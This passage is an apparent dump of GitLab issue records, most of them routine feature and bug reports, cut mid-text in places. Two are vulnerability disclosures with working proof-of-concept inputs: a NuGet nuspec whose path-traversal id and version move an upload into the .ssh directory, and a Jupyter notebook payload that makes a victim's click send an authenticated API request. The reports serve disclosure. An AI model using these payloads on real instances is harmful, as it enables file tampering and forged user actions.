This is helpful but still poses challenges as we see a lot of user signup and join existing namespaces which then inflates namespace adoption metrics since the user is new but the namespace was existing. \n \n### Proposed Solution\nWe add a `Creator_ID` to our namespace data so we know the ID of the user that created the namespace.

You can use `source` or `dist`. For stable versions, Composer will use the `dist` by default. The `source` is a version control repository, like your GitLab Project. If `--prefer-source` is enabled, Composer will install from source as a git clone instead of downloading a packaged zip file. This is useful if you want to make a bugfix to a project and get a local git clone of the dependency directly.\n\nThe problem is that until recently, you could not use the `prefer-source` and `preferred-install` commands and configurations when downloading Composer dependencies. This prevented many of you from using the GitLab Package Registry for your Composer dependencies. \n\n### Proposal\n\nAdd support for `prefer-source` and `preferred-install` so that PHP Developers can configure Composer to download packages from git instead of as a zip file. \n\n### Steps to reproduce\n\n1. Create a project in a group.\n2. Enable the Packages feature if not already enabled.\n3. Make sure the project has a valid `composer.json`:\n\n```\n{\n  \"name\": \"m4rw3r/composer-test-project\",\n  \"description\": \"Composer test project for prefer-source install\",\n  \"license\": \"MIT\"\n}\n```\n\n4. Publish the package using curl: `curl --data branch=master 'https://__token__:\u003ctoken\u003e@gitlab.com/api/v4/projects/21057249/packages/composer`.\n5. Create a new folder and add the following to a `composer.json`:\n\n```json\n{\n  \"repositories\": [\n    {\"type\":\"composer\",\"url\":\"https://gitlab.com/api/v4/group/9281167/-/packages/composer/packages.json\"}\n  ],\n  \"require\": {\n    \"m4rw3r/composer-test-project\": \"dev-master\"\n  }\n}\n```\n\n6. Attempt to install the package using `composer install -vvv --prefer-source`.\n\nThe package will install successfully, but not from source. In the log produced\nit will list that it is downloading the package as a zip-file instead of\nchecking out a clone, despite `--prefer-source` being specified.\n\n### Example Project\n\nhttps://gitlab.com/test-group321/composer-test-project","state":"closed","created_at":"2020-09-10T16:40:05.997Z","updated_at":"2021-04-27T21:26:11.573Z","closed_at":"2021-03-23T19:34:46.120Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Package Registry","Composer Repository","Deliverable","Package:P1","backend","devops::package","group::package registry","package:scaling","ruby","section::ops","type::feature","workflow::production"],"milestone":{"id":1406669,"iid":59,"group_id":9970,"title":"13.11","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2020-08-13T14:23:09.688Z","updated_at":"2022-04-21T07:22:08.835Z","due_date":"2021-04-17","start_date":"2021-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/59"},"assignees":[{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"}],"author":{"id":7010163,"username":"m4rw3r","name":"Martin Wernstål","state":"active","avatar_url":"https://secure.gravatar.com/avatar/eb2726de227b1c4b3d484e7656265985?s=80\u0026d=identicon","web_url":"https://gitlab.com/m4rw3r"},"type":"ISSUE","assignee":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"user_notes_count":36,"merge_requests_count":0,"upvotes":12,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/247531","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/247531","notes":"https://gitlab.com/api/v4/projects/278964/issues/247531/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/247531/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#247531","relative":"#247531","full":"gitlab-org/gitlab#247531"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":70991112,"iid":247530,"project_id":278964,"title":"Public snippet cannot be accessed via API without authentication","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nA public snippet can be open in the browser directly without authentication.

How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature?

Neither the extracted id or version is checked for path traversal, allowing the `package.nupkg` to be moved anywhere that the `git` user has access.\n\n\n#####  Steps to reproduce  \n1. create a project  \n1. create a `spec.nuspec` file with the following contents\n\n    ```xml  \n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;  \n\u0026lt;package xmlns=\u0026#34;http://schemas.microsoft.com/packaging/2010/07/nuspec.xsd\u0026#34;\u0026gt;  \n    \u0026lt;metadata\u0026gt;  \n        \u0026lt;id\u0026gt;../../../../../../../../../../../../../\u0026lt;/id\u0026gt;  \n        \u0026lt;version\u0026gt;./var/opt/gitlab/.ssh/aaa\u0026lt;/version\u0026gt;  \n    \u0026lt;/metadata\u0026gt;  \n\u0026lt;/package\u0026gt;    \n    ```  \n1. zip it up and upload it via the api\n\n    ```bash  \nzip package.zip spec.nuspec  \ncurl -XPUT -v  \u0026#39;http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/112/packages/nuget/\u0026#39; -F package=[@]package.zip  \n    ```  \n1. after the metadata service has run you can see that the file has been moved `ls -asl /var/opt/gitlab/.ssh/`\n\n![Screen_Shot_2020-04-01_at_2.07.29_am.png](https://h1.sec.gitlab.net/a/0493b2fb-063c-4914-acbf-d2fa8ab4f1ab/Screen_Shot_2020-04-01_at_2.07.29_am.png)\n\n\n#####  Impact  \nI\u0026#39;m still unsure of the complete impact of this, but there are a few thing to note:  \n* the file will always have the `.nupkg` extension (can\u0026#39;t see a way around this)  \n* any parent directories are also created  \n* the package has to be a valid zip file, but using something like https://truepolyglot.hackade.org/ arbitrary data can be appended to the start.\n\nKnowing the above it might be possible to escalate this further, but requires more investigation.\n\n#####  Examples  \nnuget package used above: ![package.zip](https://h1.sec.gitlab.net/a/aa63dcfa-318c-47f4-bf86-aec163ebff0a/package.zip)  \npackage that is a polyglot with a shell script: ![hello.zip](https://h1.sec.gitlab.net/a/1be426fb-9a23-4781-89b5-0306d0986048/hello.zip)\n\n#####  What is the current *bug* behavior?  \nThe package `file_name` is updated with values directly from the metadata without any checks:\n\n```ruby  \n      package_file.update!(  \n            file_name: package_filename,  \n            file: package_file.file  \n          )\n\n     def package_name  \n        metadata[:package_name]  \n      end\n\n      def package_version  \n        metadata[:package_version]  \n      end\n\n      def metadata  \n        strong_memoize(:metadata) do  \n          ::Packages::Nuget::MetadataExtractionService.new(package_file.id).execute  \n        end  \n      end\n\n      def package_filename  \n        \u0026#34;#{package_name.downcase}.#{package_version.downcase}.nupkg\u0026#34;  \n      end  \n```\n\n#####  What is the expected *correct* behavior?

Selects \"Import 234 repositories\" from the `Import repositories from GitHub` page which initiates the import. :slight_smile: \n1. User realizes they had made a mistake and needs to cancel their import and correct the error. :confused: \n1. User finds no way to cancel the import. :rage: \n1. User must go into GitLab project settings for each imported project and delete them manually. :weary: \n\nThis process is quite cumbersome and could cause a lot of frustration for the users.\n\n#

Press \u003ckbd\u003e⌘\u003c/kbd\u003e\u003ckbd\u003eB\u003c/kbd\u003e (or \u003ckbd\u003eCtrl\u003c/kbd\u003e+\u003ckbd\u003eB\u003c/kbd\u003e on non-Macs)\n\n### What is the current *bug* behavior?\n\nThe scroll jumps to the top of the page in order to bring the \"Copy branch name\" button into view.\n\n### What is the expected *correct* behavior?\n\nPressing the \u003ckbd\u003e⌘\u003c/kbd\u003e\u003ckbd\u003eB\u003c/kbd\u003e keyboard shortcut should not affect the page's scroll.\n\n### Output of checks\n\nThis bug happens on GitLab.com.\n\n### Possible fixes\n\nCurrently, this keyboard shortcut is implemented by triggering a \"click\" event on the \"Copy branch name\" button in the body of the MR page:\n\n![image](/uploads/f0b5ddae3b3095b889c99fd9217ac727/image.png)\n\nInstead, the \"click\" event could be triggered on the similar button in the MR sidebar:\n\n![image](/uploads/ee2302b3f60a643e3c4a6252153b3c41/image.png)\n\nThis would allow the main content's scroll to be unaffected.\n\nOn really short screens, this still may cause some unwanted scrolling inside the sidebar, but this is much less annoying.\n\n### Other info\n\nThis keyboard shortcut was originally developed in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/36338 (before the sidebar button existed).","state":"closed","created_at":"2020-09-09T17:12:25.714Z","updated_at":"2020-12-07T16:45:37.798Z","closed_at":"2020-10-28T13:08:18.002Z","closed_by":{"id":493585,"username":"nfriend","name":"Nathan Friend","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cd23f74a33fc7d8dfe081948696551a5?s=80\u0026d=identicon","web_url":"https://gitlab.com/nfriend"},"labels":["Category:Code Review Workflow","Deliverable","Stretch","devops::create","frontend","group::code review","internal customer","merge requests","section::dev","severity::4","shortcuts","type::bug"],"milestone":{"id":1233755,"iid":53,"group_id":9970,"title":"13.6","description":"https://about.gitlab.com/releases/2020/11/22/gitlab-13-6-released/","state":"closed","created_at":"2020-04-09T17:39:22.328Z","updated_at":"2022-04-13T14:51:04.376Z","due_date":"2020-11-17","start_date":"2020-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/53"},"assignees":[{"id":493585,"username":"nfriend","name":"Nathan Friend","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cd23f74a33fc7d8dfe081948696551a5?s=80\u0026d=identicon","web_url":"https://gitlab.com/nfriend"},{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"}],"author":{"id":493585,"username":"nfriend","name":"Nathan Friend","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cd23f74a33fc7d8dfe081948696551a5?s=80\u0026d=identicon","web_url":"https://gitlab.com/nfriend"},"type":"ISSUE","assignee":{"id":493585,"username":"nfriend","name":"Nathan Friend","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cd23f74a33fc7d8dfe081948696551a5?s=80\u0026d=identicon","web_url":"https://gitlab.com/nfriend"},"user_notes_count":8,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/247177","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/247177","notes":"https://gitlab.com/api/v4/projects/278964/issues/247177/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/247177/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#247177","relative":"#247177","full":"gitlab-org/gitlab#247177"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":70939550,"iid":247130,"project_id":278964,"title":"DevOps Adoption MVC (backend)","description":"This is the data collection ~backend implementation issue for https://gitlab.com/gitlab-org/gitlab/-/issues/247112\n\n### Proposal\n\nWe already have models for storing segments and the boolean flags (collected data), however the data collection part is missing.\n\n1.

This experience was duplicated from the revamped [paid signup flow](https://gitlab.com/gitlab-org/growth/product/-/issues/87/), where at the end of the purchase, users see a confirmation banner. Using the same checkout flow but on the group billing page, user can not see the confirmation banner after they purchase. Unless users are navigating back to the billing page, they can not tell whether the purchase was successful or not.

I'll leave it here for reference so folks can know that this is the same issue, but don't want people reading it as if it's pertinent to the current proposal.\n\n\u003cdetails\u003e\nAs a follow up of https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40547/diffs#note_405596614\n\n\u003e @mayra-cabrera: Why do we need `:project_ids` at the end? :thinking: Should it be:\n\n```ruby\nparams.permit(project_ids: [])\n```\n\n\u003e @drewcimino  `permit` returns the hash *with* the passed key, so it'd end up looking like\n\n```ruby\n{\n  current_user: current_user,\n  group: @group,\n  project_ids: {\n    project_ids: [1,2,3]\n  }\n)\n```\n\n\u003e `require` wouldn't need `[]`, but we don't want to actually require the param be passed at all.\n\n\u003e Does that make sense?\n\n\u003e @mayra-cabrera I wonder if we should change the format a bit to use `params.permit` and then declare that `project_ids` is an array:\n\n```ruby\n{ \n  current_user: current_user,\n  group: @group \n}.merge(params.permit(:start_date, :ref_path, project_ids: []))\n```\n\n\u003e @drewcimino That would work when the request is properly made, but we specifically require `start_date`, `end_date`, and `ref_path` out of the params because they're necessary for querying the coverage data.\n\n\u003e The behavior from `require`ing all the params is consistent with the [other controller that deals with this model](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/projects/ci/daily_build_group_report_results_controller.rb#L49), so I think it makes sense to keep using them unless we want to change it in both places.\n\n\u003e I've tried a bunch of permutations of this, and the cleanest looking thing I came up with is\n\n```ruby\ndef finder_param\n  {\n    ref_path: params.require(:ref_path),\n    start_date: Date.parse(params.require(:start_date))\n    end_date: Date.parse(params.require(:end_date)),\n    current_user: current_user,\n    group: @group\n  }.merge(params.permit(project_ids: []))\nend\n```\n\n\u003e which still has a problem with the keys being mixed symbols and strings because we're not writing `project_ids:` explicitly. Without a clear and obvious solution to this, would you be alright merging and creating a follow-up for this?\n\n\u003e @mayra-cabrera Just to clarify, I'm fine with having `require` or `permit` to designate the `finder_param` since we don't have strong guidelines for these. I was trying to get rid of `[:project_ids]` at the end of `params.permit(project_ids: [])[:project_ids]` since we don't use that pattern often (Or at least I haven't seen it before). Either way, this can be a follow up as you said\n\u003c/details\u003e\n\n# Proposal\n\nGiven the planned work in [another issue](https://gitlab.com/gitlab-org/gitlab/-/issues/284381#note_457497227), we completely remove the by-group finder in question once the `DailyBuildGroupReportResult` records are available via GraphQL by `namespace_id`. Since they'll be queryable by group via GraphQL, the frontend can begin using that instead of the REST controller, and we can delete the finder once that transition is made.\n\n- [x] Introduce GraphQL API for DailyBuildGroupReportResult records https://gitlab.com/gitlab-org/gitlab/-/merge_requests/46549\n- [x] Add queryable namespace_id to GraphQL resolver for DailyBuildGroupReportResult records (add `namespace_id` to `daily_build_group_report_results` table) https://gitlab.com/gitlab-org/gitlab/-/issues/284381\n- [ ] Transition all internal `gitlab/gitlab-org` requests for `DailyBuildGroupReportResult` records to GraphQL (Visualizations, https://gitlab.com/gitlab-org/gitlab/-/issues/284381)\n- [x] Delete `DailyBuildGroupReportResultByGroupFinder` (This issue, https://gitlab.com/gitlab-org/gitlab/-/issues/246902)\n\n# Risks\n\n1. We could forget about part of the GitLab application that uses this API, which will break if we don't switch it to GraphQL. To mitigate this risk, we should ship Step 3 (https://gitlab.com/gitlab-org/gitlab/-/issues/284381) first and check the controller in Grafana to make sure it receives no requests for a period of days before we ship the removal.","state":"closed","created_at":"2020-09-08T20:21:48.971Z","updated_at":"2021-10-28T14:07:50.885Z","closed_at":"2021-03-24T18:56:26.230Z","closed_by":{"id":5251734,"username":"morefice","name":"Max Orefice","state":"active","avatar_url":"https://secure.gravatar.com/avatar/0a910912e24727d7eef579cd047f7651?s=80\u0026d=identicon","web_url":"https://gitlab.com/morefice"},"labels":["Category:Code Testing and Coverage","Deliverable","[deprecated] Accepting merge requests","backend","devops::verify","group::pipeline insights","maintenance::refactor","missed-deliverable","missed:13.10","section::ops","type::maintenance","workflow::production"],"milestone":{"id":1406669,"iid":59,"group_id":9970,"title":"13.11","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2020-08-13T14:23:09.688Z","updated_at":"2022-04-21T07:22:08.835Z","due_date":"2021-04-17","start_date":"2021-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/59"},"assignees":[{"id":5251734,"username":"morefice","name":"Max Orefice","state":"active","avatar_url":"https://secure.gravatar.com/avatar/0a910912e24727d7eef579cd047f7651?s=80\u0026d=identicon","web_url":"https://gitlab.com/morefice"}],"author":{"id":33100,"username":"mayra-cabrera","name":"Mayra Cabrera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/33100/avatar.png","web_url":"https://gitlab.com/mayra-cabrera"},"type":"ISSUE","assignee":{"id":5251734,"username":"morefice","name":"Max Orefice","state":"active","avatar_url":"https://secure.gravatar.com/avatar/0a910912e24727d7eef579cd047f7651?s=80\u0026d=identicon","web_url":"https://gitlab.com/morefice"},"user_notes_count":24,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/246902","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":3},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/246902","notes":"https://gitlab.com/api/v4/projects/278964/issues/246902/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/246902/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#246902","relative":"#246902","full":"gitlab-org/gitlab#246902"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":70894881,"iid":246892,"project_id":278964,"title":"Auto-select scanner/site profile if there is only one option","description":"####  Problem\nWhen confronted with the empty `New on-demand scan` form, users didn't realize they had to select a profile from the dropdown in order to proceed.\n\n\n\n#### Proposal\nWhen creating a new on-demand scan, if there is only one scanner or site profile option, we should auto-select that profile.

Currently piloting, details can be found in this issue: https://gitlab.com/gitlab-com/Product/-/issues/1392 and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes \n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve\n\nAs a user of GitLab, it's hard to find the relevant sections of the site, so I can't do my job.\n\nAs part of https://gitlab.com/gitlab-org/gitlab/-/issues/211406, we explored different ways of organizing the Operations nav items. As part of our validation for these proposed in https://gitlab.com/gitlab-org/ux-research/-/issues/833, we learned that 91% of the people surveyed don't think Serverless or Kubernetes belong under Operations.\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops) \n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n\n### User experience goal\n\n\u003c!-- What is the single user experience workflow this problem addresses? \nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e \n\nEnsure that our navigation is usable and that our features are discoverable.\n\n### Proposal\n\n\u003c!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey --\u003e\n\nMove \n\n- Serverless\n- Kubernetes\n- Terraform\n\ninto a separate navigation item called **Infrastructure**.\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\nThis navigation change will allow us to introduce additional menu items to our navigation **if needed** without overloading the already crowded menu item Operations. In other words it will give the opportunity to the Configure team to own a specific section of the navigation anad make changes as necessary.\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members \n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### Links / references\n\n[Figma file](https://www.figma.com/file/t3zaXHEpDWytAoOb5Zux2t/Re-work-navigation-for-GitLab-Operations-project-211406?node-id=55%3A0)\n\n### Additional tasks\n- [ ] Update the [navigation map in Mural](https://app.mural.co/t/gitlab2474/m/gitlab2474/1589571490215/261462d0beb3043979374623710d3f2d6cfec1cb)\n\n### Availability and Testing\n\nPlease run `package-and-qa` and assign a SET as a reviewer as it is possible the change will break existing tests.","state":"closed","created_at":"2020-09-08T15:28:43.066Z","updated_at":"2022-05-05T23:13:38.283Z","closed_at":"2021-05-07T08:14:31.845Z","closed_by":{"id":955795,"username":"fjsanpedro","name":"Francisco Javier López","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/955795/avatar.png","web_url":"https://gitlab.com/fjsanpedro"},"labels":["Category:Navigation \u0026 Settings","SUS::FY22 Q1 -

We also have two runners that take care of our pipeline (not using the shared runners of gitlab).\n\nWhen restoring the nuget packages, nuget asks all sources for all required packages. So the gitlab registry will also be called for packages that are on nuget.org.\n\nWith the rate limits used on gitlab.com (see [docs](https://docs.gitlab.com/ce/user/gitlab_com/index.html#gitlabcom-specific-rate-limits) and [current settings](https://gitlab.com/gitlab-cookbooks/gitlab-haproxy/blob/master/attributes/default.rb)) our runners constantly get `429 Too many requests` as soon as a few .net jobs are running.\n\nThis basically renders the gitlab package repository completly useless for us. Nuget is a pretty request intensive package manager and the current rate limits of gitlab.com seem way too low.\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n- Pipeline building a .NET project, preferrably something with a bunch of references like an AspNet Core API project\n- Add a nuget package source using a package registry on gitlab.com\n- Pipeline should run on an own runner (you probably won't get the error on shared runners)\n- Start multiple (3-4?) build jobs (`dotnet restore` should be enough)\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\nConstantly getting `429 Too many requests` for the NuGet package registry API\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\nHigher rate limits for the NuGet package registry API, so that a normal usage doesn't constantly run against the rate limits.\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n```\nMicrosoft (R) Build Engine version 16.7.0-preview-20360-03+188921e2f for .NET\nCopyright (C) Microsoft Corporation.

In turn, Jupyter Notebooks provide the possibility for [rich output via HTML](https://nbviewer.jupyter.org/github/ipython/ipython/blob/master/examples/IPython%20Kernel/Rich%20Output.ipynb#HTML). Although most tags and attributes are stripped from the HTML output rendered in GitLab\u0026#39;s rich representation, it retains `data-*` attributes. Using [`jquery-ujs`](https://gitlab.com/gitlab-org/gitlab/-/blob/4e12f87c013f59070bf1156bb2427af9fa9123c4/package.json#L101) as a gadget, it is possible to trigger `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params). On https://gitlab.com, the CSP restricts the target, while there is no such limitation for self-hosted GitLab instances. As of now, this vulnerability requires user interaction in the form of a single click followed by and applies to https://gitlab.com as well as self-hosted GitLab instances.\n\n#####  Steps to reproduce\n\n1. Create a GitLab project or refer to an existing project.  \n2. Upload an `exploit.ipynb` file with the following contents:\n\n     ```json  \n    {  \n      \u0026#34;cells\u0026#34;: [  \n        {  \n          \u0026#34;metadata\u0026#34;: { \u0026#34;trusted\u0026#34;: true },  \n          \u0026#34;cell_type\u0026#34;: \u0026#34;code\u0026#34;,  \n          \u0026#34;source\u0026#34;: \u0026#34;Tell me something about you!\u0026#34;,  \n          \u0026#34;execution_count\u0026#34;: 1,  \n          \u0026#34;outputs\u0026#34;: [  \n            {  \n              \u0026#34;output_type\u0026#34;: \u0026#34;display_data\u0026#34;,  \n              \u0026#34;data\u0026#34;: {  \n                \u0026#34;text/plain\u0026#34;: \u0026#34;\u0026lt;IPython.core.display.HTML object\u0026gt;\u0026#34;,  \n                \u0026#34;text/html\u0026#34;: \u0026#34;What\u0026#39;s your favorite color?\u0026amp;emsp;\u0026lt;select data-method=\\\u0026#34;put\\\u0026#34; data-params=\\\u0026#34;message=p0wn3d\\\u0026#34; data-remote=\\\u0026#34;true\\\u0026#34; data-url=\\\u0026#34;/api/v4/user/status\\\u0026#34;\u0026gt;\u0026lt;option\u0026gt;Red\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Green\u0026lt;/option\u0026gt;\u0026lt;option\u0026gt;Blue\u0026lt;/option\u0026gt;\u0026lt;/select\u0026gt;\\n\u0026#34;  \n              },  \n              \u0026#34;metadata\u0026#34;: {}  \n            }  \n          ]  \n        }  \n      ],  \n      \u0026#34;metadata\u0026#34;: {  \n        \u0026#34;kernelspec\u0026#34;: {  \n          \u0026#34;name\u0026#34;: \u0026#34;python3\u0026#34;,  \n          \u0026#34;display_name\u0026#34;: \u0026#34;Python 3\u0026#34;,  \n          \u0026#34;language\u0026#34;: \u0026#34;python\u0026#34;  \n        },  \n        \u0026#34;language_info\u0026#34;: {  \n          \u0026#34;name\u0026#34;: \u0026#34;python\u0026#34;,  \n          \u0026#34;version\u0026#34;: \u0026#34;3.7.8\u0026#34;,  \n          \u0026#34;mimetype\u0026#34;: \u0026#34;text/x-python\u0026#34;,  \n          \u0026#34;codemirror_mode\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;ipython\u0026#34;, \u0026#34;version\u0026#34;: 3 },  \n          \u0026#34;pygments_lexer\u0026#34;: \u0026#34;ipython3\u0026#34;,  \n          \u0026#34;nbconvert_exporter\u0026#34;: \u0026#34;python\u0026#34;,  \n          \u0026#34;file_extension\u0026#34;: \u0026#34;.py\u0026#34;  \n        }  \n      },  \n      \u0026#34;nbformat\u0026#34;: 4,  \n      \u0026#34;nbformat_minor\u0026#34;: 4  \n    }  \n    ```  \nwhere `cells[0].outputs[0].data.text/html` contains the payload.  \n3. In the *Files*  view of the project, click on the above-added `exploit.ipynb`.  \n4. Select an 